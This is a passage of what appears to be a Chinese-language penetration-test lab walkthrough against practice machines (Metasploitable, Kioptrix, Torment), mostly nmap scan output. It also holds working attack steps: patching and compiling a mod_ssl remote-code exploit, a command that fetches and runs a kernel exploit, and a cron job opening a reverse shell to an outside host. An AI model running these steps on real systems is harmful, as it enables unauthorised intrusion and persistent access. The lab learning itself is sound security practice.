Site doesn&#x27;t have a title (text/html).</span><br><span class="line"><span class="number">139</span>/tcp  open  netbios-ssn Samba smbd <span class="number">3</span>.X - <span class="number">4</span>.X (<span class="attribute">workgroup</span>: WORKGROUP)</span><br><span class="line"><span class="number">445</span>/tcp  open  netbios-ssn Samba smbd <span class="number">3.0</span>.<span class="number">20</span>-Debian (<span class="attribute">workgroup</span>: WORKGROUP)</span><br><span class="line"><span class="number">3306</span>/tcp open  mysql       MySQL <span class="number">5.0</span>.<span class="number">51</span>a-<span class="number">3</span>ubuntu5</span><br><span class="line">| <span class="attribute">mysql-info</span>:</span><br><span class="line">|   <span class="attribute">Protocol</span>: <span class="number">10</span></span><br><span class="line">|   <span class="attribute">Version</span>: <span class="number">5.0</span>.<span class="number">51</span>a-<span class="number">3</span>ubuntu5</span><br><span class="line">|   Thread <span class="attribute">ID</span>: <span class="number">38</span></span><br><span class="line">|   Capabilities <span class="attribute">flags</span>: <span class="number">43564</span></span><br><span class="line">|   Some <span class="attribute">Capabilities</span>: Support41Auth, SupportsTransactions, Speaks41ProtocolNew, SwitchToSSLAfterHandshake, ConnectWithDatabase, SupportsCompression, LongColumnFlag</span><br><span class="line">|   <span class="attribute">Status</span>: Autocommit</span><br><span class="line">|_  <span class="attribute">Salt</span>: iFdElnd*DUaeWet8Z=_J</span><br><span class="line">|<span class="attribute">_ssl-cert</span>: <span class="attribute">ERROR</span>: Script execution failed (use -d to debug)</span><br><span class="line">|<span class="attribute">_ssl-date</span>: <span class="attribute">ERROR</span>: Script execution failed (use -d to debug)</span><br><span class="line">|<span class="attribute">_sslv2</span>: <span class="attribute">ERROR</span>: Script execution failed (use -d to debug)</span><br><span class="line">|<span class="attribute">_tls-alpn</span>: <span class="attribute">ERROR</span>: Script execution failed (use -d to debug)</span><br><span class="line">|<span class="attribute">_tls-nextprotoneg</span>: <span class="attribute">ERROR</span>: Script execution failed (use -d to debug)</span><br><span class="line"><span class="number">5432</span>/tcp open  postgresql  PostgreSQL DB <span class="number">8.3</span>.<span class="number">0</span> - <span class="number">8.3</span>.<span class="number">7</span></span><br><span class="line">| <span class="attribute">ssl-cert</span>: <span class="attribute">Subject</span>: commonName=ubuntu804-base.localdomain/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX</span><br><span class="line">| Not valid <span class="attribute">before</span>: <span class="number">2010</span><span class="attribute">-03-17T14</span>:<span class="number">07</span>:<span class="number">45</span></span><br><span class="line">|_Not valid <span class="attribute">after</span>:  <span class="number">2010</span><span class="attribute">-04-16T14</span>:<span class="number">07</span>:<span class="number">45</span></span><br><span class="line">|<span class="attribute">_ssl-date</span>: <span class="number">2021</span><span class="attribute">-01-06T09</span>:<span class="number">33</span>:<span class="number">18</span>+<span class="number">00</span>:<span class="number">00</span>; -<span class="number">11</span>d22h01m15s from scanner time.</span><br><span class="line"><span class="number">8009</span>/tcp open  ajp13       Apache Jserv (Protocol v1.<span class="number">3</span>)</span><br><span class="line">|<span class="attribute">_ajp-methods</span>: Failed to get a valid response for the OPTION request</span><br><span class="line"><span class="number">8180</span>/tcp open  http        Apache Tomcat/Coyote JSP engine <span class="number">1.1</span></span><br><span class="line">|<span class="attribute">_http-favicon</span>: Apache Tomcat</span><br><span class="line">|<span class="attribute">_http-title</span>: Apache Tomcat/<span class="number">5.5</span></span><br><span class="line">Service <span class="attribute">Info</span>: <span class="attribute">Host</span>:  metasploitable.localdomain; <span class="attribute">OSs</span>: Unix, Linux; <span class="attribute">CPE</span>: <span class="attribute">cpe</span>:/<span class="attribute">o</span>:<span class="attribute">linux</span>:linux_kernel</span><br><span class="line"></span><br><span class="line">Host script <span class="attribute">results</span>:</span><br><span class="line">|<span class="attribute">_clock-skew</span>: <span class="attribute">mean</span>: -<span class="number">11</span>d20h21m14s, <span class="attribute">deviation</span>: <span class="number">2</span>h53m14s, <span class="attribute">median</span>: -<span class="number">11</span>d22h01m15s</span><br><span class="line">|<span class="attribute">_nbstat</span>: NetBIOS <span class="attribute">name</span>: METASPLOITABLE, NetBIOS <span class="attribute">user</span>: &lt;unknown&gt;, NetBIOS <span class="attribute">MAC</span>: &lt;unknown&gt; (unknown)</span><br><span class="line">| <span class="attribute">smb-os-discovery</span>:</span><br><span class="line">|   <span class="attribute">OS</span>: Unix (Samba <span class="number">3.0</span>.<span class="number">20</span>-Debian)</span><br><span class="line">|   Computer <span class="attribute">name</span>: metasploitable</span><br><span class="line">|   NetBIOS computer <span class="attribute">name</span>:</span><br><span class="line">|   Domain <span class="attribute">name</span>: localdomain</span><br><span class="line">|   <span class="attribute">FQDN</span>: metasploitable.localdomain</span><br><span class="line">|_  System <span class="attribute">time</span>: <span class="number">2021</span><span class="attribute">-01-06T04</span>:<span class="number">31</span>:<span class="number">51</span><span class="attribute">-05</span>:<span class="number">00</span></span><br><span class="line">| <span class="attribute">smb-security-mode</span>:</span><br><span class="line">|   <span class="attribute">account_used</span>: guest</span><br><span class="line">|   <span class="attribute">authentication_level</span>: user</span><br><span class="line">|   <span class="attribute">challenge_response</span>: supported</span><br><span class="line">|_  <span class="attribute">message_signing</span>: disabled (dangerous, but default)</span><br><span class="line">|<span class="attribute">_smb2-time</span>: Protocol negotiation failed (SMB2)</span><br></pre></td></tr></table></figure>
+
+<p>好家伙，竟然直接叫metasploitable…可能是相当于我们平时学习时自己搭的漏洞环境</p>
+<p>一个服务一个服务拿到msf中去跑，smb的漏洞（我也不懂）直接拿到root</p>
+<p>跑不出来shell的话换一个payload就好</p>
+<p>[<img src="https://fre4k5en.me/Users/fre4k5en/Library/Application%20Support/typora-user-images/image-20210118180145421.png" alt="image-20210118180145421">](<a href="https://fre4k5en.me/Users/fre4k5en/Library/Application">https://fre4k5en.me/Users/fre4k5en/Library/Application</a> Support/typora-user-images/image-20210118180145421.png)</p>
+<p>尝试hashcat跑这三个hash，无果</p>
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gms0pak7jgj30u00xg7bt.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gms0pak7jgj30u00xg7bt.jpg" alt="image-20210118182003094"></a></p>
+<hr>
+<h3 id="192-168-100-166"><a href="#192-168-100-166" class="headerlink" title="192.168.100.166"></a>192.168.100.166</h3><p>照例</p>
+<figure class="highlight less"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">❯ <span class="selector-tag">nmap</span> <span class="selector-tag">-sC</span> <span class="selector-tag">-sV</span> <span class="selector-tag">192</span><span class="selector-class">.168</span><span class="selector-class">.100</span><span class="selector-class">.166</span></span><br><span class="line"><span class="selector-tag">Starting</span> <span class="selector-tag">Nmap</span> <span class="selector-tag">7</span><span class="selector-class">.91</span> ( <span class="attribute">https</span>:<span class="comment">//nmap.org ) at 2021-01-21 18:14 CST</span></span><br><span class="line">Nmap scan report for <span class="number">192.168</span>.<span class="number">100.166</span></span><br><span class="line">Host is up (<span class="number">0.069s</span> latency).</span><br><span class="line">Not <span class="attribute">shown</span>: <span class="number">993</span> closed ports</span><br><span class="line">PORT      STATE SERVICE     VERSION</span><br><span class="line"><span class="number">22</span>/tcp    open  ssh         OpenSSH <span class="number">2.9</span>p2 (protocol <span class="number">1.99</span>)</span><br><span class="line">| <span class="attribute">ssh-hostkey</span>:</span><br><span class="line">|   <span class="number">1024</span> <span class="attribute">b8</span>:<span class="number">74</span>:<span class="number">6</span><span class="attribute">c</span>:<span class="attribute">db</span>:<span class="attribute">fd</span>:<span class="number">8</span><span class="attribute">b</span>:<span class="attribute">e6</span>:<span class="number">66</span>:<span class="attribute">e9</span>:<span class="number">2</span><span class="attribute">a</span>:<span class="number">2</span><span class="attribute">b</span>:<span class="attribute">df</span>:<span class="number">5</span><span class="attribute">e</span>:<span class="number">6</span><span class="attribute">f</span>:<span class="number">64</span>:<span class="number">86</span> (RSA1)</span><br><span class="line">|   <span class="number">1024</span> <span class="number">8</span><span class="attribute">f</span>:<span class="number">8</span><span class="attribute">e</span>:<span class="number">5</span><span class="attribute">b</span>:<span class="number">81</span>:<span class="attribute">ed</span>:<span class="number">21</span>:<span class="attribute">ab</span>:<span class="attribute">c1</span>:<span class="number">80</span>:<span class="attribute">e1</span>:<span class="number">57</span>:<span class="attribute">a3</span>:<span class="number">3</span><span class="attribute">c</span>:<span class="number">85</span>:<span class="attribute">c4</span>:<span class="number">71</span> (DSA)</span><br><span class="line">|_  <span class="number">1024</span> <span class="attribute">ed</span>:<span class="number">4</span><span class="attribute">e</span>:<span class="attribute">a9</span>:<span class="number">4</span><span class="attribute">a</span>:<span class="number">06</span>:<span class="number">14</span>:<span class="attribute">ff</span>:<span class="number">15</span>:<span class="number">14</span>:<span class="attribute">ce</span>:<span class="attribute">da</span>:<span class="number">3</span><span class="attribute">a</span>:<span class="number">80</span>:<span class="attribute">db</span>:<span class="attribute">e2</span>:<span class="number">81</span> (RSA)</span><br><span class="line">|<span class="attribute">_sshv1</span>: Server supports SSHv1</span><br><span class="line"><span class="number">53</span>/tcp    open  domain?</span><br><span class="line"><span class="number">80</span>/tcp    open  http        Apache httpd <span class="number">1.3</span>.<span class="number">20</span> ((Unix)  (Red-Hat/Linux) mod_ssl/<span class="number">2.8</span>.<span class="number">4</span> OpenSSL/<span class="number">0.9</span>.<span class="number">6</span>b)</span><br><span class="line">| <span class="attribute">http-methods</span>:</span><br><span class="line">|_  Potentially risky <span class="attribute">methods</span>: TRACE</span><br><span class="line">|<span class="attribute">_http-server-header</span>: Apache/<span class="number">1.3</span>.<span class="number">20</span> (Unix)  (Red-Hat/Linux) mod_ssl/<span class="number">2.8</span>.<span class="number">4</span> OpenSSL/<span class="number">0.9</span>.<span class="number">6</span>b</span><br><span class="line">|<span class="attribute">_http-title</span>: Test Page for the Apache Web Server on Red Hat Linux</span><br><span class="line"><span class="number">111</span>/tcp   open  rpcbind     <span class="number">2</span> (RPC <span class="number">#100000</span>)</span><br><span class="line">| <span class="attribute">rpcinfo</span>:</span><br><span class="line">|   program version    port/proto  service</span><br><span class="line">|   <span class="number">100000</span>  <span class="number">2</span>            <span class="number">111</span>/tcp   rpcbind</span><br><span class="line">|   <span class="number">100000</span>  <span class="number">2</span>            <span class="number">111</span>/udp   rpcbind</span><br><span class="line">|   <span class="number">100024</span>  <span class="number">1</span>          <span class="number">32768</span>/tcp   status</span><br><span class="line">|_  <span class="number">100024</span>  <span class="number">1</span>          <span class="number">32768</span>/udp   status</span><br><span class="line"><span class="number">139</span>/tcp   open  netbios-ssn Samba smbd (<span class="attribute">workgroup</span>: MYGROUP)</span><br><span class="line"><span class="number">443</span>/tcp   open  ssl/https   Apache/<span class="number">1.3</span>.<span class="number">20</span> (Unix)  (Red-Hat/Linux) mod_ssl/<span class="number">2.8</span>.<span class="number">4</span> OpenSSL/<span class="number">0.9</span>.<span class="number">6</span>b</span><br><span class="line">|<span class="attribute">_http-server-header</span>: Apache/<span class="number">1.3</span>.<span class="number">20</span> (Unix)  (Red-Hat/Linux) mod_ssl/<span class="number">2.8</span>.<span class="number">4</span> OpenSSL/<span class="number">0.9</span>.<span class="number">6</span>b</span><br><span class="line">|<span class="attribute">_http-title</span>: <span class="number">400</span> Bad Request</span><br><span class="line">| <span class="attribute">ssl-cert</span>: <span class="attribute">Subject</span>: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--</span><br><span class="line">| Not valid <span class="attribute">before</span>: <span class="number">2009</span><span class="attribute">-09-26T09</span>:<span class="number">32</span>:<span class="number">06</span></span><br><span class="line">|_Not valid <span class="attribute">after</span>:  <span class="number">2010</span><span class="attribute">-09-26T09</span>:<span class="number">32</span>:<span class="number">06</span></span><br><span class="line">|<span class="attribute">_ssl-date</span>: <span class="number">2021</span><span class="attribute">-01-06T13</span>:<span class="number">13</span>:<span class="number">52</span>+<span class="number">00</span>:<span class="number">00</span>; -<span class="number">14</span>d21h02m17s from scanner time.</span><br><span class="line">| <span class="attribute">sslv2</span>:</span><br><span class="line">|   SSLv2 supported</span><br><span class="line">|   <span class="attribute">ciphers</span>:</span><br><span class="line">|     SSL2_DES_64_CBC_WITH_MD5</span><br><span class="line">|     SSL2_RC2_128_CBC_WITH_MD5</span><br><span class="line">|     SSL2_DES_192_EDE3_CBC_WITH_MD5</span><br><span class="line">|     SSL2_RC4_128_WITH_MD5</span><br><span class="line">|     SSL2_RC4_64_WITH_MD5</span><br><span class="line">|     SSL2_RC4_128_EXPORT40_WITH_MD5</span><br><span class="line">|_    SSL2_RC2_128_CBC_EXPORT40_WITH_MD5</span><br><span class="line"><span class="number">32768</span>/tcp open  status      <span class="number">1</span> (RPC <span class="number">#100024</span>)</span><br><span class="line"></span><br><span class="line">Host script <span class="attribute">results</span>:</span><br><span class="line">|<span class="attribute">_clock-skew</span>: -<span class="number">14</span>d21h02m17s</span><br><span class="line">|<span class="attribute">_nbstat</span>: NetBIOS <span class="attribute">name</span>: KIOPTRIX, NetBIOS <span class="attribute">user</span>: &lt;unknown&gt;, NetBIOS <span class="attribute">MAC</span>: &lt;unknown&gt; (unknown)</span><br><span class="line">|<span class="attribute">_smb2-time</span>: Protocol negotiation failed (SMB2)</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at <span class="attribute">https</span>:<span class="comment">//nmap.org/submit/ .</span></span><br><span class="line">Nmap <span class="attribute">done</span>: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned in <span class="number">74.35</span> seconds</span><br></pre></td></tr></table></figure>
+
+<p>一个一个searchsploit，发现apache模块mod_ssl 2.8.4存在rce</p>
+<p>[<img src="https://fre4k5en.me/Users/fre4k5en/Library/Application%20Support/typora-user-images/image-20210121182155858.png" alt="image-20210121182155858">](<a href="https://fre4k5en.me/Users/fre4k5en/Library/Application">https://fre4k5en.me/Users/fre4k5en/Library/Application</a> Support/typora-user-images/image-20210121182155858.png)</p>
+<p>直接开干</p>
+<p>但是发现需要编译，而初次编译的时候会报错，推荐使用kali，这样可以直接安装libssl-dev，mac就有点麻烦了</p>
+<p>装上openssl还是报错，仔细看下发现一个是版本导致的方法名称改变造成的</p>
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gmvhqlgf6jj31020nugr0.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gmvhqlgf6jj31020nugr0.jpg" alt="image-20210121182610788"></a></p>
+<p>google之后找到方法，修改c文件</p>
+<p><a href="https://www.hypn.za.net/blog/2017/08/27/compiling-exploit-764-c-in-2017/">https://www.hypn.za.net/blog/2017/08/27/compiling-exploit-764-c-in-2017/</a></p>
+<p>文件头部添加引用和定义</p>
+<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;openssl/rc4.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;openssl/md5.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SSL2_MT_ERROR 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SSL2_MT_CLIENT_FINISHED 3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SSL2_MT_SERVER_HELLO 4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SSL2_MT_SERVER_VERIFY 5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SSL2_MT_SERVER_FINISHED 6</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SSL2_MAX_CONNECTION_ID_LENGTH 16</span></span><br></pre></td></tr></table></figure>
+
+<p>672行（左右，因为刚才加入了新行）替换语句</p>
+<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> COMMAND2 <span class="meta-string">&quot;unset HISTFILE; cd /tmp; wget https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p; \n&quot;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>970行添加</p>
+<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *p, *end;</span><br></pre></td></tr></table></figure>
+
+<p>1078行替换</p>
+<figure class="highlight isbl"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="variable"><span class="keyword">if</span></span> (<span class="function"><span class="title">EVP_PKEY_get1_RSA</span>(<span class="variable">pkey</span>) == <span class="variable"><span class="literal">NULL</span></span>) &#123;</span></span><br></pre></td></tr></table></figure>
+
+<p>1084行替换</p>
+<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">encrypted_key_length = <span class="constructor">RSA_public_encrypt(RC4_KEY_LENGTH, <span class="params">ssl</span>-&gt;<span class="params">master_key</span>, &amp;<span class="params">buf</span>[10], EVP_PKEY_get1_RSA(<span class="params">pkey</span>)</span>, RSA_PKCS1_PADDING);</span><br></pre></td></tr></table></figure>
+
+<p>最后编译，执行</p>
+<figure class="highlight dns"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">gcc -o <span class="number">764 764</span>.c -lcrypto</span><br><span class="line">./<span class="number">764</span></span><br></pre></td></tr></table></figure>
+
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gmvhpu8v2fj30uy0oak6t.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gmvhpu8v2fj30uy0oak6t.jpg" alt="image-20210121182527472"></a></p>
+<p>根据提示找到对应内核和apache版本对应的supported：0x6a、0x6b</p>
+<figure class="highlight dns"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">./<span class="number">764</span> <span class="number">0</span>x6a <span class="number">192.168.100.166</span> <span class="number">443</span> -c <span class="number">50</span></span><br></pre></td></tr></table></figure>
+
+<p>一次不行就多执行几次</p>
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gmvhy6xma2j30u00w14ie.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gmvhy6xma2j30u00w14ie.jpg" alt="image-20210121183329045"></a></p>
+<p>得到apache账户shell，经常断开</p>
+<p>find / -perm -u=s -type f 2&gt;/dev/null</p>
+<p>搜索suid程序</p>
+<p>发现可以执行/usr/bin/crontab</p>
+<p>赶紧写一个计划任务</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">vim <span class="regexp">/tmp/</span>a.cron</span><br><span class="line">* * * * * <span class="regexp">/bin/</span>bash -i &gt;&amp; <span class="regexp">/dev/</span>tcp<span class="regexp">/10.8.0.3/</span><span class="number">8888</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br><span class="line">:wq</span><br><span class="line"><span class="regexp">/usr/</span>bin<span class="regexp">/crontab /</span>tmp/a.cron</span><br></pre></td></tr></table></figure>
+
+<p>每分钟反弹一次shell</p>
+<p>linpeas无法执行，unix-privesc-check可以勉强运行</p>
+<p>但是没看出来有什么能提权的点，还是太菜了。。。</p>
+<hr>
+<h3 id="192-168-100-17"><a href="#192-168-100-17" class="headerlink" title="192.168.100.17"></a>192.168.100.17</h3><figure class="highlight tap"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">❯ nmap -sC -sV 192.168.100.17</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-22 10:20 CST</span><br><span class="line">Nmap scan report for 192.168.100.17</span><br><span class="line">Host is up (0.075s latency).</span><br><span class="line">Not shown:<span class="number"> 986 </span>closed ports</span><br><span class="line">PORT     STATE SERVICE     VERSION</span><br><span class="line">21/tcp   open  ftp         vsftpd 2.0.8 or later</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">| -rw-r--r--   <span class="number"> 1 </span>ftp      ftp       <span class="number"> 112640 </span>Dec<span class="number"> 28 </span><span class="number"> 2018 </span>alternatives.tar.0</span><br><span class="line">| -rw-r--r--   <span class="number"> 1 </span>ftp      ftp         <span class="number"> 4984 </span>Dec<span class="number"> 23 </span><span class="number"> 2018 </span>alternatives.tar.1.gz</span><br><span class="line">| -rw-r--r--   <span class="number"> 1 </span>ftp      ftp        <span class="number"> 95760 </span>Dec<span class="number"> 28 </span><span class="number"> 2018 </span>apt.extended_states.0</span><br><span class="line">| -rw-r--r--   <span class="number"> 1 </span>ftp      ftp        <span class="number"> 10513 </span>Dec<span class="number"> 27 </span><span class="number"> 2018 </span>apt.extended_states.1.gz</span><br><span class="line">| -rw-r--r--   <span class="number"> 1 </span>ftp      ftp        <span class="number"> 10437 </span>Dec<span class="number"> 26 </span><span class="number"> 2018 </span>apt.extended_states.2.gz</span><br><span class="line">| -rw-r--r--   <span class="number"> 1 </span>ftp      ftp          <span class="number"> 559 </span>Dec<span class="number"> 23 </span><span class="number"> 2018 </span>dpkg.diversions.0</span><br><span class="line">| -rw-r--r--   <span class="number"> 1 </span>ftp      ftp          <span class="number"> 229 </span>Dec<span class="number"> 23 </span><span class="number"> 2018 </span>dpkg.diversions.1.gz</span><br><span class="line">| -rw-r--r--   <span class="number"> 1 </span>ftp      ftp          <span class="number"> 229 </span>Dec<span class="number"> 23 </span><span class="number"> 2018 </span>dpkg.diversions.2.gz</span><br><span class="line">| -rw-r--r--   <span class="number"> 1 </span>ftp      ftp          <span class="number"> 229 </span>Dec<span class="number"> 23 </span><span class="number"> 2018 </span>dpkg.diversions.3.gz</span><br><span class="line">| -rw-r--r--   <span class="number"> 1 </span>ftp      ftp          <span class="number"> 229 </span>Dec<span class="number"> 23 </span><span class="number"> 2018 </span>dpkg.diversions.4.gz</span><br><span class="line">| -rw-r--r--   <span class="number"> 1 </span>ftp      ftp          <span class="number"> 229 </span>Dec<span class="number"> 23 </span><span class="number"> 2018 </span>dpkg.diversions.5.gz</span><br><span class="line">| -rw-r--r--   <span class="number"> 1 </span>ftp      ftp          <span class="number"> 229 </span>Dec<span class="number"> 23 </span><span class="number"> 2018 </span>dpkg.diversions.6.gz</span><br><span class="line">| -rw-r--r--   <span class="number"> 1 </span>ftp      ftp          <span class="number"> 505 </span>Dec<span class="number"> 28 </span><span class="number"> 2018 </span>dpkg.statoverride.0</span><br><span class="line">| -rw-r--r--   <span class="number"> 1 </span>ftp      ftp          <span class="number"> 295 </span>Dec<span class="number"> 28 </span><span class="number"> 2018 </span>dpkg.statoverride.1.gz</span><br><span class="line">| -rw-r--r--   <span class="number"> 1 </span>ftp      ftp          <span class="number"> 295 </span>Dec<span class="number"> 28 </span><span class="number"> 2018 </span>dpkg.statoverride.2.gz</span><br><span class="line">| -rw-r--r--   <span class="number"> 1 </span>ftp      ftp          <span class="number"> 295 </span>Dec<span class="number"> 28 </span><span class="number"> 2018 </span>dpkg.statoverride.3.gz</span><br><span class="line">| -rw-r--r--   <span class="number"> 1 </span>ftp      ftp          <span class="number"> 295 </span>Dec<span class="number"> 28 </span><span class="number"> 2018 </span>dpkg.statoverride.4.gz</span><br><span class="line">| -rw-r--r--   <span class="number"> 1 </span>ftp      ftp          <span class="number"> 295 </span>Dec<span class="number"> 28 </span><span class="number"> 2018 </span>dpkg.statoverride.5.gz</span><br><span class="line">| -rw-r--r--   <span class="number"> 1 </span>ftp      ftp          <span class="number"> 295 </span>Dec<span class="number"> 28 </span><span class="number"> 2018 </span>dpkg.statoverride.6.gz</span><br><span class="line">| -rw-r--r--   <span class="number"> 1 </span>ftp      ftp      <span class="number"> 1719127 </span>Jan<span class="number"> 01 </span><span class="number"> 2019 </span>dpkg.status.0</span><br><span class="line">|_Only<span class="number"> 20 </span>shown. Use --script-args ftp-anon.maxlist=-1 to see all.</span><br><span class="line">| ftp-syst:</span><br><span class="line">|   STAT:</span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to ::ffff:172.24.191.129</span><br><span class="line">|      Logged in as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth limit</span><br><span class="line">|      Session timeout in seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      At session startup, client count was 2</span><br><span class="line">|      vsFTPd 3.0.3 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">22/tcp   open  ssh         OpenSSH 7.4p1 Debian 10+deb9u4 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|  <span class="number"> 2048 </span>84:c7:31:7a:21:7d:10:d3:a9:9c:73:c2:c2:2d:d6:77 (RSA)</span><br><span class="line">|_ <span class="number"> 256 </span>66:c7:d0:be:8d:9d:9f:bf:78:67:d2:bc:cc:7d:33:b9 (ED25519)</span><br><span class="line">25/tcp   open  smtp        Postfix smtpd</span><br><span class="line">|_smtp-commands: TORMENT.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8,</span><br><span class="line">| ssl-cert: Subject: commonName=TORMENT</span><br><span class="line">| Subject Alternative Name: DNS:TORMENT</span><br><span class="line">| Not valid before: 2018-12-23T14:28:47</span><br><span class="line">|_Not valid after:  2028-12-20T14:28:47</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">53/tcp   open  domain?</span><br><span class="line">80/tcp   open  http        Apache httpd 2.4.25</span><br><span class="line">|_http-server-header: Apache/2.4.25</span><br><span class="line">|_http-title: Apache2 Debian Default Page: It works</span><br><span class="line">111/tcp  open  rpcbind     2-4 (RPC <span class="comment">#100000)</span></span><br><span class="line">| rpcinfo:</span><br><span class="line">|   program version    port/proto  service</span><br><span class="line">|  <span class="number"> 100000 </span> 2,3,4        111/tcp   rpcbind</span><br><span class="line">|  <span class="number"> 100000 </span> 2,3,4        111/udp   rpcbind</span><br><span class="line">|  <span class="number"> 100000 </span> 3,4          111/tcp6  rpcbind</span><br><span class="line">|  <span class="number"> 100000 </span> 3,4          111/udp6  rpcbind</span><br><span class="line">|  <span class="number"> 100003 </span> 3,4         2049/tcp   nfs</span><br><span class="line">|  <span class="number"> 100003 </span> 3,4         2049/tcp6  nfs</span><br><span class="line">|  <span class="number"> 100003 </span> 3,4         2049/udp   nfs</span><br><span class="line">|  <span class="number"> 100003 </span> 3,4         2049/udp6  nfs</span><br><span class="line">|  <span class="number"> 100005 </span> 1,2,3      34514/udp6  mountd</span><br><span class="line">|  <span class="number"> 100005 </span> 1,2,3      47603/udp   mountd</span><br><span class="line">|  <span class="number"> 100005 </span> 1,2,3      54413/tcp6  mountd</span><br><span class="line">|  <span class="number"> 100005 </span> 1,2,3      59783/tcp   mountd</span><br><span class="line">|  <span class="number"> 100021 </span> 1,3,4      32889/tcp6  nlockmgr</span><br><span class="line">|  <span class="number"> 100021 </span> 1,3,4      35801/udp   nlockmgr</span><br><span class="line">|  <span class="number"> 100021 </span> 1,3,4      39667/tcp   nlockmgr</span><br><span class="line">|  <span class="number"> 100021 </span> 1,3,4      49636/udp6  nlockmgr</span><br><span class="line">|  <span class="number"> 100227 </span><span class="number"> 3 </span>          2049/tcp   nfs_acl</span><br><span class="line">|  <span class="number"> 100227 </span><span class="number"> 3 </span>          2049/tcp6  nfs_acl</span><br><span class="line">|  <span class="number"> 100227 </span><span class="number"> 3 </span>          2049/udp   nfs_acl</span><br><span class="line">|_ <span class="number"> 100227 </span><span class="number"> 3 </span>          2049/udp6  nfs_acl</span><br><span class="line">139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">143/tcp  open  imap        Dovecot imapd</span><br><span class="line">|_imap-capabilities: LITERAL+ more OK IMAP4rev1 listed AUTH=PLAIN have ENABLE LOGIN-REFERRALS AUTH=LOGINA0001 capabilities ID SASL-IR post-login Pre-login IDLE</span><br><span class="line">445/tcp  open  netbios-ssn Samba smbd 4.5.12-Debian (workgroup: WORKGROUP)</span><br><span class="line">631/tcp  open  ipp         CUPS 2.2</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Potentially risky methods: PUT</span><br><span class="line">|_http-server-header: CUPS/2.2 IPP/2.1</span><br><span class="line">|_http-title: Forbidden - CUPS v2.2.1</span><br><span class="line">2049/tcp open  nfs_acl    <span class="number"> 3 </span>(RPC <span class="comment">#100227)</span></span><br><span class="line">6667/tcp open  irc         ngircd</span><br><span class="line">6668/tcp open  irc         ngircd</span><br><span class="line">6669/tcp open  irc         ngircd</span><br><span class="line">Service Info: Hosts:  TORMENT.localdomain, TORMENT, irc.example.net; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: -15d19h43m18s, deviation: 4h37m06s, median: -15d17h03m19s</span><br><span class="line">|_nbstat: NetBIOS name: TORMENT, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span><br><span class="line">| smb-os-discovery:</span><br><span class="line">|   OS: Windows 6.1 (Samba 4.5.12-Debian)</span><br><span class="line">|   Computer name: torment</span><br><span class="line">|   NetBIOS computer name: TORMENT\x00</span><br><span class="line">|   Domain name: \x00</span><br><span class="line">|   FQDN: torment</span><br><span class="line">|_  System time: 2021-01-06T17:17:12+08:00</span><br><span class="line">| smb-security-mode:</span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-security-mode:</span><br><span class="line">|   2.02:</span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time:</span><br><span class="line">|   date: 2021-01-06T09:17:11</span><br><span class="line">|_  start_date: N/A</span><br></pre></td></tr></table></figure>
+
